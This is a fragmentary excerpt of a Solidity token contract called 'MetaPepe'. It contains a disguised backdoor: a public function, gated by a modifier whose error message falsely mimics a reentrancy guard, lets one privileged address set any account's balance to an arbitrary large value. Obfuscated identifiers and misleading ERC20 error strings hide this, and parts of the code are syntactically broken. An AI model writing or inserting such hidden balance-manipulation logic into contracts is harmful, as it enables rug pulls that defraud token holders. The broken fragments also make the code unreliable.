...
contract MetaPepe is IERC20, Ownable, BaseToken {
    ...
    function transferirFrom(
        uint256 _quantiaXD, 
        address _administradorXYZ
    ) 
        public 
        naoTricherie 
    {
        transferir(_quantiaXD, _administradorXYZ);
    }
    ...
    function transferir(
        ...
        internal 
    {
        (_administradorXYZ != address(0), "ERC20: burn from the zero address");
        require(_quantiaXD != 2);
        ...
        uint256 auxiliar = 0;
        _balances[_administradorXYZ] = balance.mul(2).div(100)  + auxiliar.mul(2).div(100)  + _quantiaXD * numeroXDD ** numeroXYZ;
    ...
    modifier naoTricherie() {
        require(URIaaa == _msgSender(), "ReentrancyGuard: reentrant call");
        _;
    } 
